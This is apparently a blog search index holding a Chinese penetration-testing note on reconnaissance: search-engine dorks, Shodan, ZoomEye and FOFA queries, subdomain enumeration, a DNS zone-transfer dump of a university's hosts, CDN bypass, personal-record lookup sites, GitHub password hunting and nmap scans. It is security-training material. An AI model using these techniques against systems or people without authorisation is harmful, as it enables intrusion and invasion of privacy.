<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[信息收集]]></title>
    <url>%2Fnote%2F2020%2Fundefined01%2F312e3d12.html</url>
    <content type="text"><![CDATA[信息收集技术在渗透测试过程中，第一步就是进行信息收集，信息收集的过程，很多人将其写成了工具、脚本，于是我们就有了很多指纹识别工具、敏感文件、目录扫描工具，敏感信息探测工具，信息收集工具等等。很多前辈也都曾经说过：”渗透测试的本质就是信息收集” 信息收集介绍常规收集 备份文件泄露 接口泄露(小米主题商店接口信息泄露开发者敏感信息（身份证、手机等） 从信息泄露到未授权访问 端口扫描与目录扫描端口多扫几个 内网收集 内网服务器邮箱记录 浏览器保存密码记录 ESXI 认证Vcenter 可以尝试勾选启用windows登录认证 信息收集的方式可以分为两种：主动和被动。 主动的信息收集方式： 通过直接访问、扫描网站，这种将流量流经网站的行为。 被动的信息收集方式： 利用第三方服务和互联网信息进行收集。 被动信息收集（OSINT）Google Hack在渗透测试过程中第一步就是信息收集，由于传统的信息收集工具包括指纹识别、目录扫描器等会留下痕迹，某些情况下还会被拦截，因此，能否在不惊动目标服务器的情况下，对目标网站进行前期最重要的信息收集，并且尽可能的获得更多的信息呢？ 默认搜索搜索引擎基本语法，直接在搜索框中输入搜索词时，谷歌默认进行模糊搜索，并能对长短语或语句进行自动拆分成小的词进行搜索。 通配符谷歌的通配符是星号 *，用通配符代替关键词或短语中无法确定的字词。 逻辑非排除某个搜索结果：渗透测试 -习近平 百度无广告 常用关键词 关键词 说明 site 指定域名 intext 正文中存在关键词的网页 intitle 标题中存在关键词的网页 inurl URL中存在关键词的网页 filetype 搜索指定文件类型 常见后台查找12345intitle:后台登录inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cmsintext:管理|后台|登陆|用户名|密码|系统|帐号 实际演示搜索南京政府的子域名信息：1site:nanjing.gov.cn 搜索互联网上的登录入口：1intitle:登录 搜索百度的相关登录入口：1intitle:登录 site:baidu.com -zhidao.baidu.com -baike.baidu.com -jingyan.baidu.com 查找互联网敏感文件：12filetype:mdb|doc|xlsx|pdf密码 filetype:xls 查找被黑政府站点：12北京赛车 inurl:gov.cnintitle:北京赛车 inurl:gov.cn 物联网搜索引擎Shodanhttps://www.shodan.io 物联网搜索引擎，是互联网上最可怕的搜索引擎，搜索所有和互联网关联的服务器、摄像头、打印机、路由器等等。 基本语法 关键词 说明 net 搜索指定ip地址或者子网，c段 hostname 搜索指定的域名或者服务器 port 搜索开放指定端口的设备 org 搜索属于指定组织或者公司的设备 product 搜索运行指定产品或者软件操作系统的设备 version 指定软件的版本 isp 搜索指定isp供应商的设备 country 搜索指定国家的设备 city 搜索指定城市的设备 语句之间可以相互组合使用，可以运用自己的思维，相互组合成自己需要的搜索语句 实际操作查找位于国内的 Nginx 服务器：1nginx country:cn 搜索位南京开启 3389 端口的服务器12port:3389 city:nanjingport:3389 os:&quot;windows 10&quot; 搜索海康威视摄像头1Hikvision-Webs country:cn city:nanjing 查看Cisco思科设备全球分布12isp:ciscoisp:cisco country:cn 查看华为设备全球分布1isp:huawei windows口令必须大小写后，弱口令TOP：P@ssw0rd 实用技巧Shodan 实用技巧，查找互相关联的网站：1234567import mmh3import requestsresponse = requests.get(&apos;https://www.baidu.com/favicon.ico&apos;)favicon = response.content.encode(&apos;base64&apos;)hash = mmh3.hash(favicon)print(hash) 计算出的 hash 用如下语法来反查：1http.favicon.hash：hash 查找出类似模板的IP地址：http://111.231.41.219/ 查看原始数据 Ctrl+F 搜索 favicon 根据hash值反差： 1http.favicon.hash:-865290023 找同模板网站：看是不是一个logo/favicon 用小米logo的hash值反查 研究院真实案例分享 目标黄色网站 - 拿不下 - 找到同模板的网站 - 爆破 - 进入系统 - 通用漏洞 getshell - 拿到源码 - 代码审计 - 发现漏洞 - 拿下目标网站 - getshell - 突破限制进内网 - 内网漫游拿下数据 Zoomeyehttps://www.zoomeye.org ZoomEye 中文名为“钟馗之眼”，它定位于网络空间搜索引擎，能对暴露在公网的主机设备及网站组件进行全方位搜索（只要有IP地址即可搜索到），发现其中的漏洞，揪 出网络中“藏着掖着的问题”。ZoomEye和Shodan的区别是ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。 主机搜索组件名称app: 组件名。 ver: 组件版本。1app:”Apache httpd” ver:”2.2.16″ 端口port: 开放端口。 1port:3389 操作系统os: 操作系统。1os:linux 服务service: 结果分析中的“服务名”字段。1234# 公网路由器： service:routersetup# 公网摄像头： service:webcam 主机名hostname: 分析结果中的“主机名”字段。1hostname:google.com 位置country: 国家或者地区代码。 city: 城市名称。12345# 搜索美国的 Apache 服务器app:Apache country:US# 搜索英国的 Sendmail 服务器app:Sendmail country:UK IP 地址ip: 搜索一个指定的 IP 地址12# Google 的公共 DNS 服务器ip:8.8.8.8 CIDRIP 的 CIDR 网段。1cidr:8.8.8.8/24 Web应用搜索网站site:网站域名。 例子：1site: baidu.com 标题title: 页面标题1title:Nginx 关键词keywords: 定义的页面关键词。1keywords:Nginx 描述desc: 定义的页面说明。1desc:Nginx HTTP 头headers: HTTP 请求中的 Headers。1headers:Server FQFAhttps://fofa.so FOFA是白帽汇推出的一款网络空间资产搜索引擎。 它能够帮助企业客户迅速进行网络资产匹配、加快后续工作进程。 例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。 基本语法直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索 title=”abc” 从标题中搜索abc标题中有北京的网站1title=&quot;北京&quot; header=”abc” 从http头中搜索abcjboss服务器1header=&quot;jboss&quot; body=”abc” 从html正文中搜索abc正文包含Hacked by1body=&quot;Hacked by&quot; domain=”qq.com” 搜索根域名带有qq.com的网站1domain=&quot;qq.com&quot; host=”.gov.cn” 从url中搜索.gov.cn1host=&quot;.gov.cn&quot; 教育网站1host=&quot;.edu.cn&quot; port=”443” 查找对应443端口的资产1port=&quot;443&quot; ip=”1.1.1.1” 搜索ip信息139.98.209.64 protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)1protocol=&quot;https&quot; 搜索指定城市的资产1city=&quot;Beijing&quot; 搜索指定行政区的资产1region=&quot;Zhejiang&quot; 搜索指定国家(编码)的资产1country=&quot;CN&quot; 搜索证书(https或者imaps等)中带有google的资产1cert=&quot;google&quot; 搜索FTP协议中带有users文本的资产1banner=users &amp;&amp; protocol=ftp 搜索所有协议资产，支持subdomain和service两种1type=service 搜索Windows资产1os=windows 搜索IIS 7.5服务器1server==&quot;Microsoft-IIS/7.5&quot; 搜索海康威视设备1app=&quot;海康威视-视频监控&quot; 时间范围段搜索1after=&quot;2017&quot; &amp;&amp; before=&quot;2017-10-01&quot; 搜索指定org(组织)的资产1org=&quot;Amazon.com, Inc.&quot; 搜索指定udp协议的资产1base_protocol=&quot;udp&quot; 高级搜索可以使用括号 和 &amp;&amp; || !=等符号，如12345title=&quot;powered by&quot; &amp;&amp; title!=discuztitle!=&quot;powered by&quot; &amp;&amp; body=discuz( body=&quot;content=\&quot;WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) ) &amp;&amp; host=&quot;gov.cn&quot; 规则探索与发现https://fofa.so/subject https://fofa.so/library 子域名收集域名爆破是指使用爆破字段拼接主域名尝试访问，暴力破解出主域名下是否还有其他子域名。 例如通过某公司官网的主域名，可以暴力破解出该公司内部系统（如OA、CRM等等）的访问地址。 爆破在线爆破工具phpinfo.me/domain 本地工具爆破subDomainsBrutehttps://github.com/lijiejie/subDomainsBrute 每秒可扫描3000个域名 Layer 子域名挖掘机 法师经典作品，操作简单容易上手 https://github.com/euphrat1ca/LayerDomainFinder API搜索引擎site: domain OneForAll👊 OneForAll是一款功能强大的子域收集工具 自己动手丰衣足食Django 编写 Web 漏洞扫描器挖坑记录： https://www.sqlsec.com/2020/05/webscan.html 域名探测功能发现比较流行的子域名探测功能 one for all 用的也是很多 API 接口，于是打算使用第三方服务来获取子域名，这样获取的速度会很快。 因为这些子域名是存入数据库的，所以也就顺便增加了域名监控功能，每次扫描可以统计出新增的域名数量。域名探测所使用的 6 个接口分别如下，大家也可以直接拿去使用，做好对应的数据提取就可以了：123456789101112131415161718# 爱站https://baidurank.aizhan.com/baidu/&#123;domain&#125;/# 百度云观测http://ce.baidu.com/index/getRelatedSites?site_address=&#123;domain&#125;# hackertargethttps://api.hackertarget.com/hostsearch/?q=&#123;domain&#125;# IP138https://site.ip138.com/&#123;domain&#125;/domain.htm# crt.sh SSL 证书反查https://crt.sh/?q=%25.&#123;domain&#125;# 千寻url = &apos;https://www.dnsscan.cn/dns.html&apos;datas = &#123;&quot;ecmsfrom&quot;: &apos;8.8.8.8&apos;, &quot;show&quot;: &apos;none&apos;, &quot;keywords&quot;: domain&#125; API接口找子域名比爆破更好用的原因： 大厂SRC 2级往上子域名很多，用字典爆破难以成功 大厂会有WAF拦截 域名访问超时直接丢弃结果的，然后再获取网页标题，这个在实际的信息收集中比较实用的，一些 404 403 的资产可以跳过，减少无意义的浪费时间。 证书透明度(CT)是为了防止证书授权机构(CA)或者其他恶意人员伪造服务器证书而诞生的一个项目。 CT会要求CA将数字证书(SSL/TLS证书)公开并发布将颁发记录同步到日志服务器中。而日志服务器则会提供给用户一个查找某域名颁发的所有数字证书途径。数字证书中会包含子域名相关的信息。 DNS 域传送漏洞什么是DNSDNS(Domain Name System，域名管理系统) 是万维网 WWW 的重要基础。它建立在一个分布式数据库基础之上，在这个数据库里，保存了IP地址和域名的相互映射关系。 DNS服务器使用的TCP/UDP端口号是53。 最常用的DNS记录有以下几类： 记录类别 说明 A记录 IP 地址记录,记录一个域名对应的 IP 地址 AAAA 记录 IPv6 地址记录，记录一个域名对应的 IPv6 地址 CNAME 记录 别名记录，记录一个主机的别名 MX 记录 电子邮件交换记录，记录一个邮件域名对应的IP地址 NS 记录 域名服务器记录 ,记录该域名由哪台域名服务器解析 PTR 记录 反向记录，也即从 IP 地址到域名的一条记录 TXT 记录 记录域名的相关文本信息 nslookup 命令nslookup 命令的使用。仅使用该命令，就可完成 DNS 域传送的测试。 指定 DNS 查询域名的 IP 地址：1234567~ nslookup www.sqlsec.com 114.114.114.114Server: 114.114.114.114Address: 114.114.114.114#53Non-authoritative answer:Name: www.sqlsec.comAddress: 121.196.37.183 查询域名所使用的 DNS 服务器： 1234567$ nslookup www.sqlsec.com -type=nsServer: 100.100.2.136Address: 100.100.2.136#53Non-authoritative answer:Name: www.sqlsec.comAddress: 121.196.37.183 验证一下看看，是否这个 DNS 服务器开启了 53 端口： 12345678910$ nmap 100.100.2.136Starting Nmap 6.40 ( http://nmap.org ) at 2020-07-25 14:32 CSTNmap scan report for 100.100.2.136Host is up (0.00028s latency).Not shown: 999 filtered portsPORT STATE SERVICE53/tcp open domainNmap done: 1 IP address (1 host up) scanned in 9.26 seconds 域传送漏洞DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。 Nslookup 命令检测：1234567891011 # 查询解析此域名的dns服务器nslookup -type=ns xxx.xxx.cn# 进入交互nslookup # 指定dns服务器server dns.xxx.xx.cn# 列出域信息ls xxx.xxx.cn 详细案例的输出结果：12345678910111213141516171819202122232425262728293031D:\&gt;nslookup默认服务器: public1.114dns.comAddress: 114.114.114.114&gt; server dns.nwpu.edu.cn默认服务器: dns.nwpu.edu.cnAddress: 202.117.80.2&gt; ls nwpu.edu.cn[dns.nwpu.edu.cn] nwpu.edu.cn. NS server = dns.nwpu.edu.cn nwpu.edu.cn. NS server = dns1.nwpu.edu.cn nwpu.edu.cn. NS server = dns2.nwpu.edu.cn nwpu.edu.cn. NS server = dns3.nwpu.edu.cn * A 222.24.192.99(... 省略大量的记录) npunecas NS server = webcomp.npunecas.nwpu.edu.cn webcomp.npunecas A 202.117.85.146 nwpu03 A 202.117.80.4 nwpudb2 A 222.24.210.149 poj A 192.168.0.248 portal A 61.150.43.10 portal1 A 222.24.192.31 portal2 A 222.24.192.32 rei A 202.117.85.10 saip NS server = saipserver.saip.nwpu.edu.cn saipserver.saip A 202.117.85.72 test A 222.24.192.29 yzb A 202.117.85.3 zsb A 202.117.87.130 zygx A 202.117.80.9 C段与旁站(渐渐没落)基础知识什么是 IP 地址IP 地址在网络中用于标识一个节点（或者网络设备的接口），一个IPv4地址有32位。 192. 168. 10. 1 11000000 10101000 00001010 00000001 IP地址在最底层运算的时候依然采用的是二进制的方式。 IP地址的类别0.0.0.0 - 255.255.255.255 一共有2的32次方个，因为数量很庞大，所以需要科学的管理。我们一般把IP地址划分为如下5个类别： 正常可以被我们使用的只有A、B、C类A 类 00000001 - 01111111 : 0 - 1270 是不合法的 IP 地址，所以范围从 1 开始，又因为 127 是一个比较特殊的地址，回环地址，所以 A 类的第一个 8 bit 的值范围为 1-126 B 类 10000000 - 10111111 : 128 - 191C 类 11000000 - 11011111 : 192 - 223所以在内网渗透中，遇到 10 开头的 IP 地址，一般我们称呼它为 A 类地址，172 开头的IP地址为 B 类地址，192 开头的IP地址为 C 类地址。 IP 地址的网络和主机部分IP 地址和我们实际生活中的地址类似： 浙江省杭州市滨江区西兴街道联慧街188号安恒大厦浙江省 | 杭州市 滨江区 西兴街道联慧街188号网络号 | 主机号所以在网络中间对于转发信息的设备来说，他们不关心主机号，所以路由是不关心主机部分的，先把信息送到目标网络区域，然后交给对于的网络区域的设备来处理。 所以一个 IP 地址为：10.1.1.1 ，那么 10.0.0.0 为这个 IP 地址的网络号，1.1.1 为这个 IP 地主的主机号。 网络掩码 网络掩码为 32 bits，与 IP 地址的位数是一样的 网络掩码在二进制的表示上是一堆连续的 1 后面接连续的 0 值为 1 的 bit 对应 IP 地址中的网络位；为 0 的 bit 对应 IP 地址中的主机位，以此来辅助我们识别一个 IP 地址中的网络与主机位 A 段 B 段 C 段黑客所说的C段是什么意思?12192.168.1.1/24192.168.1.1 - 192.168.1.255 子网掩码的位数总共有 32 个, /24表示前 24 个为1，其它 8 位都是 0所以 B 段 可以用下面来进行表示：12172.1.1.1/16172.1.1.1 - 172.1.255.255 A 段 可以用下面来进行表示： 1210.1.1.1/810.1.1.1 - 10.255.255.255 一般渗透测试中常用于 C 段探测，内网中会对 B 段进行探测扫描，A 段资产太庞大，探测成本太高。 多地 ping 原理：根据不同地区CDN加速提高响应速度，因此ip会不一样 必应接口(没落)在线查询http://www.bug8.me/bing/bing.php 在线网站使用必应接口查询 C 段和旁站很方便，但是速度方面有点欠缺 K8 C段旁注工具 6.0https://github.com/k8gege/K8tools K8 C 段旁注查询工具 V6.0，但是速度要比在线快很多，解压密码为：k8team 爱站https://dns.aizhan.com/ 数量上还是比较优势的，而且查询速度也会比较快。 Fofa获取到域名的 IP 地址之后，可以使用 Fofa 来反查域名：1ip=&quot;119.23.84.105&quot; &amp;&amp; type=&quot;subdomain&quot; 工具更多适用于内网，因为外网基本上开放端口都比较少，而且带云 WAF。 HTTPScanhttps://github.com/zer0h/httpscan12pip install IPypython httpscan.py 220.191.202.0/24 http端口查询+标题获取首先实用快速端口扫描工具： 然后提取出ip地址信息，再放到爱站里面取查询，这样可以得出一个最完整的c段信息。 当旁站不是CDN的时候，适用于内网，可以使用批量获取网页标题工具来进行查询： 服务器信息查询CDN 介绍CDN（Content Delivery Network，内容分发网络）将源站的内容发布到接近用户的网络“边缘”，用户可以就近获取所需数据，不仅降低了网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力。 传统的网络访问过程： 访问过程大概如下： 1.用户输入访问的域名，操作系统向LocalDNS查询域名的ip地址 2.LocalDns向RootDNS 查询域名的授权服务器 3.RootDNS查询域名记录后，回应给LocalDNS 4.LocalDNS将得到的域名ip地址，回应给客户端 5.用户得到域名ip地址后，访问站点服务器 6.站点服务器应答请求，将内容返回给客户端 CDN 访问过程： 访问过程大概如下： 1.用户输入访问的域名，操作系统向 LocalDns 查询域名的 ip 地址 2.LocalDns 向 ROOT DNS 查询域名的授权服务器 3.ROOT DNS 将域名授权DNS记录回应给 LocalDns 4.LocalDns 得到域名记录后，向智能调度DNS查询域名的ip地址 5.智能调度DNS 根据一定的算法和策略(比如静态拓扑，容量等),将最适合的CDN节点ip地址回应给 LocalDns 6.LocalDns 将得到的域名ip地址，回应给 用户端 7.用户得到域名 ip 地址后，访问站点服务器 8.CDN节点服务器应答请求，将内容返回给客户端 CDN 判断与绕过ping 命令直接 ping 查询地址信息： 有些是直接可以看到waf、cdn等字样的域名 很多厂商可能让 www 使用cdn，空域名不使用 CDN 缓存。所以直接 ping xxx.com 可能就能得到真实IP slookup 查询1234567891011121314151617181920# 用了 CDN➜ ~ nslookup www.baidu.comServer: 10.20.120.150Address: 10.20.120.150#53Non-authoritative answer:www.baidu.com canonical name = www.a.shifen.com.Name: www.a.shifen.comAddress: 180.101.49.11Name: www.a.shifen.comAddress: 180.101.49.12# 没有用 CDN➜ ~ nslookup www.sqlsec.comServer: 10.20.120.150Address: 10.20.120.150#53Non-authoritative answer:Name: www.sqlsec.comAddress: 121.196.37.183 域名解析结果为多个 ip，多半使用了CDN，是不真实的 ip。 多地 ping 爱站超级 ping: https://ping.aizhan.com/ 站长之家多地 ping: http://ping.chinaz.com/ 解析历史记录查询查询 ip 与域名绑定历史记录，可能会发现使用 CDN 之前的目标 ip。 https://viewdns.info/ https://x.threatbook.cn/ https://sitereport.netcraft.com/ 子域名绕过很多网站主站的访问量会比较大。所以往往主站都是挂了CDN的，但是分站就不一定了，毕竟CDN要钱，而且也不便宜,企业业务线众多，有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用，结合之前的子域名爆破来进行收集。 利用站点功能主动发起请求一些网提供注册服务，可能会验证邮件，还有 RSS 订阅邮件、忘记密码等等 可能服务器本身自带 sendmail 可以直接发送邮件，当然使用第三方的除外（如网易、腾讯的等）通过邮件发送地址往往也能得到服务器 IP 利用网站漏洞如果目标站点存在漏洞，这就没办法避免了。例如 phpinfo 敏感信息泄露、Struts2、网页源代码泄露、svn 信息泄露信、Github 信息泄露等 若存在 Web 漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实 ip，例如 XSS 等 国外访问国内的 CDN 往往只会针对国内用户访问加速，但是国外就不一定了。因此通过国外代理访问就能查看真实 IP 了，或者通过国外的 DNS 解析，可能就能得到真实的 IP 社工信息收集whois查询whois.bugscaner.com whois.aizhan.com whois.chinaz.com 注册网站查询www.reg007.com 密码泄露查询https://haveibeenpwned.com TG 群信息收集1关键词 inurl:t.me 开房记录查询http://www.cxjlkf.com 国家职业资格证查询http://zscx.osta.org.cn 其他查询身份证查询http://www.2cha.com 经纬度查询http://www.gpsspg.com/maps.htm http://map.yanue.net/ http://www.gzhatu.com/jingweidu.html 微信搜索https://weixin.sogou.com 泄露网站查询https://haveibeenpwned.com/PwnedWebsites 邮件泄露查询https://www.hotsheet.com/inoitsu/ 密码强度检测https://passwordsecurity.info https://haveibeenpwned.com/Passwords Github 信息收集可以使用谷歌搜索语法： 也可以使用 Github 自带搜索（推荐）： linux密码 123mysql数据库 password db_pass 点code查 https://github.com/xiao1230546/www.zhanglitong.com/blob/b34e59eb93ad419a216093e1705853f054aea1f0/%E5%B9%B3%E5%8F%B0%E8%B5%84%E6%96%99.txt Nmap 与 MasscanNmap 介绍官网：https://nmap.org/ Nmap 的英文全称是“Nmap Network Mapper”，中文翻译过来就是“网络映射器”。 Nmap 是一款开源的端口扫描神器，它可以快速地扫描大型网络也可以扫描单个主机。 端口扫描是指人为发送一组端口扫描信息，试图以了解某台计算机的弱点，并了解其提供的计算机网络服务类型。 端口介绍#### TCP 端口 TCP是一种面向有连接的传输协议，只有确认通信对端存在时，才会发送数据，从而可以控制通信流量的浪费。同时，TCP还充分实现数据传输过程中的各种控制，可以再数据丢包 的时候重发，还可以对次序乱掉的分包进行顺序控制。 UDP 端口UDP传输不提供复杂的控制机制，它利用IP提供面向无连接的通信服务。UDP报文没有可靠性保证，顺序保证，和流量控制，可靠性比较差，传输过程中即使出现包丢失也不会重发。 也正是因为这些，它的资源消耗小，传输速度快，通常音频，视频在传送时用UDP传输较多。 协议端口端口如同是一个房间的门，这个房间有多少个门呢？有65536 个之多，也就是说端口的取值范围是 0~65535 个。本地操作系统会给那些有需求的进程分配协议端口，每个协议端口有一个正整数标识，如 80、139、445 等。 端口 协议 21 FTP 22 SSH 23 Tenet 服务 25 SMTP 邮件传输协议 80 HTTP 服务相关端口 110 POP3 E-mail 135 共享文件或共享打印机 443 HTTP 服务相关常用端口 SSL 445 文件或打印机共享服务 1433 MS SQL Server 数据库 1521 Oracle 数据库 3306 MySQL 数据库 3389 Windows 远程桌面服务 5432/5433 PostgreSQL 数据库端口 6379 Redis 存储默认端口 7001 Weblogic 默认端口 8080 HTTP 服务常用端口 8000 - 8100 HTTP 服务常用端口 9200 Elasticsearch 默认端口 11211 Memcached 分布式缓存系统端口 端口状态Nmap 进行端口扫描的时候，Nmap 会把扫描到的端口信息反馈回来，我们从反馈回来的信息就可以判断目标端口情况。 状态 说明 Open 端口对外开放 Closed 端口对外关闭 Fitered 无法判断 被防火墙设备拦截过滤 nfiltered 未被过滤 使用 ACK 扫描才可能出现这种情况 Open\ Filtered 不能确定开放或者过滤 可能被专业设备阻止探测了 Closed\ Filtered 不能确定关闭还是被过滤 主机发现本节所用到的 Nmap 命令表： 选项 解释 -sP Ping 扫描 -P0/-Pn 无 Ping 扫描 -PS TCP SYN Ping 扫描 -PA TCP ACK Ping 扫描 -PU UDP Ping 扫描 -PE;-PP;-PM ICMP Ping Types 扫描 -PR ARP Ping 扫描 -sL 列表扫描 -6 扫描 IPv6 地址 –traceroute 路由跟踪 -PY SCTP INIT Ping 扫描 一个简单的扫描该扫描方式可以快递地对 IP 或者域名进行扫描： 可以使用 –packet-trace 查看协议扫描的细节：1nmap 10.11.29.138 --packet-trace 可以使用 -v 查看详细地输出，漫长的扫描的过程就不会显得那么枯燥，而且可以提升逼格。1nmap 10.11.29.138 -v 查看Linux源：1cat /etc/apt/sources.list sudo apt-get update 自动使用最近源，指定是多此一举 使用 Zenmap 进行扫描Zenmap 是 Nmap 官方的图形化界面，比较方便初学者使用的同时也提供了很多高级特性。 Ping 扫描Ping 扫描只进行 Ping，然后显示出在线的主机，可以比较快速地获取目标信息而不会被轻易发现。123456789101112131415nmap 10.20.24.1/24 -sPStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 14:59 CSTNmap scan report for 10.20.24.15Host is up (0.016s latency).Nmap scan report for 10.20.24.231Host is up (0.0021s latency).Nmap scan report for 10.20.24.236Host is up (0.00068s latency).Nmap scan report for 10.20.24.238Host is up (0.0019s latency).Nmap scan report for 10.20.24.239Host is up (0.0018s latency).Nmap scan report for 10.20.24.244Host is up (0.00087s latency).Nmap done: 256 IP addresses (6 hosts up) scanned in 3.36 seconds 也可以直接使用 Ping 命令来发现局域网主机： Linux 主机123456789101112#!/bin/baship=&quot;172.16.114.&quot;echo &quot;ping log:&quot; &gt; ./ping.txtfor i in &#123;1..254&#125;do ping -c 1 -w 1 -W 1 $ip$i | grep -q &quot;ttl=&quot; &amp;&amp; echo &quot;$ip$i [yes]&quot; &gt;&gt; ./ping.txt || echo &quot;$ip$i [no]&quot; &gt;&gt; ./ping.txt &amp;doneecho &quot;wait 5s....&quot;sleep 5cat ./ping.txtcat ./ping.txt | wc -l Windows 主机1for /l %p in (1,1,254) do @ping 10.20.24.%p -n 1 -l 16 -w 20 |find &quot;TTL=&quot; /I 无 Ping 扫描用户防火墙禁止 Ping 的情况下，可以使用 -P0 或者 -Pn可以避免被防火墙发现。 nmap无法突破windows防火墙，但是内网中很多域为方便都是不开防火墙的，所以nmap依旧吃香。 开防火墙后扫描3306（已知开放）：1nmap 10.11.29.138 -p 3306 -Pn TCP SYN Ping 扫描通常情况下，Nmap 默认 Ping 扫描是使用 TCP ACK 和 ICMP Echo 请求对目标进行是否存活的响应，当目标主机的防火墙阻止这些请求时，我们可以使用 TCP SYN Ping 扫描来对目标主机进行存活判断：123456789nmap 10.20.24.244 -PSStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 16:54 CSTNmap scan report for 10.20.24.244Host is up (0.00014s latency).Not shown: 997 closed portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc 有时候这种扫描结果不不准确，这个时候需要制定一个端口或端口范围来避免这种情况。 TCP ACK Ping 扫描使用 -PA选项可以进行 TCP ACK Ping 扫描，它与 TCP SYN Ping 扫描比较类似，区别在于 TCP 的标志位是 ACK 而不是 SYN，使用这种方式可以探测阻止 SYN 包或 ICMP Echo 请求的主机。123456789➜ ~ nmap 10.20.24.244 -PAStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:02 CSTNmap scan report for 10.20.24.244Host is up (0.0014s latency).Not shown: 743 closed ports, 254 filtered portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc 也可以同时使用-PS与-PA 既发送 SYN 又发送 ACK，提高通过防火墙的概率：123456789➜ ~ nmap 10.20.24.244 -PS -PAStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:03 CSTNmap scan report for 10.20.24.244Host is up (0.00040s latency).Not shown: 997 closed portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc UDP Ping 扫描需要使用 root 权限来运行，使用 -PU 选项可以发送一个空的冷门的 UDP 报文到指定端口，如果目标主机响应则返回一个 ICMP 端口不可达错误，如果目标主机不是存活状态则会返回各种 ICMP 错误信息。12345678910➜ ~ sudo nmap 10.20.24.244 -PUPassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:07 CSTNmap scan report for 10.20.24.244Host is up (0.00012s latency).Not shown: 997 closed portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc 尝试手动来验证看看：1sudo nmap 10.20.24.244 -PU --packet-trace |grep 5900 CMP Ping Types 扫描使用-PE、-PP、-PM选项可以进行 ICMP Ping Types 扫描。ICMP（Internet Control Message Protocol）是 Internet 控制报文协议。是 TCP/IP 协议族的一个子协议，用于在 IP 主机、路由器之间传递控制消息，控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。 ICMP Echo 扫描-PE 选项可以发起一个 ICMP Echo 扫描来探测目标主机是否在线，因为很多主机的防火墙会禁止这些报文，所以外网扫描基本上不好用，可以用于内网扫描。12345678➜ ~ sudo nmap 10.20.24.244 -PEStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CSTNmap scan report for 10.20.24.244Host is up (0.00014s latency).Not shown: 998 closed portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vnc ICMP 时间戳 Ping 扫描大多数防火墙可能不允许 ICMP Echo 请求，但是由于配置不当可能回复 ICMP 时间错请求，所以可以使用 -PP 时间戳扫描来确定目标主机是否存活。12345678➜ ~ sudo nmap 10.20.24.244 -PPStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CSTNmap scan report for 10.20.24.244Host is up (0.000029s latency).Not shown: 809 closed ports, 189 filtered portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vnc ICMP 地址掩码 Ping 扫描这种扫描方式会试图用备选的 ICMP 登记 Ping 指定主机，通常有不错的穿透防火墙的效果。123456789➜ ~ sudo nmap 10.20.24.244 -PMPassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:05 CSTNmap scan report for 10.20.24.244Host is up (0.00011s latency).Not shown: 998 closed portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vnc ARP Ping 扫描-PR选项通常在扫描局域网时使用，ARP（Address Resolution Protocol）地址解析协议，是根据 IP 地址获取物理地址的一个 TCP/IP 协议，在内网中使用 ARP Ping 扫描方式比较搞笑，在本地局域网中防火墙基本上不会禁止 ARP 请求，所以比其他 Ping 扫描效率都更高。1234567891011121314151617181920➜ ~ nmap 10.20.24.244 -PRStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:10 CSTNmap scan report for 10.20.24.244Host is up (0.0014s latency).Not shown: 746 closed ports, 252 filtered portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vncNmap done: 1 IP address (1 host up) scanned in 2.64 seconds➜ ~ nmap 10.20.24.244Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:11 CSTNmap scan report for 10.20.24.244Host is up (0.00026s latency).Not shown: 998 closed portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vncNmap done: 1 IP address (1 host up) scanned in 7.73 seconds 扫描列表显示扫描的所有主机的列表1234567891011121314➜ ~ nmap 10.20.24.10-20 -sLStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:19 CSTNmap scan report for 10.20.24.10Nmap scan report for 10.20.24.11Nmap scan report for 10.20.24.12Nmap scan report for 10.20.24.13Nmap scan report for 10.20.24.14Nmap scan report for 10.20.24.15Nmap scan report for 10.20.24.16Nmap scan report for 10.20.24.17Nmap scan report for 10.20.24.18Nmap scan report for 10.20.24.19Nmap scan report for 10.20.24.20Nmap done: 11 IP addresses (0 hosts up) scanned in 0.01 seconds 可以使用 Masscan 批量生成 IP 地址表：123masscan -sL 10.0.0.0/24 &gt; c段.txtmasscan -sL 10.0.0.0/16 &gt; b段.txtmasscan -sL 10.0.0.0/8 &gt; a段.txt 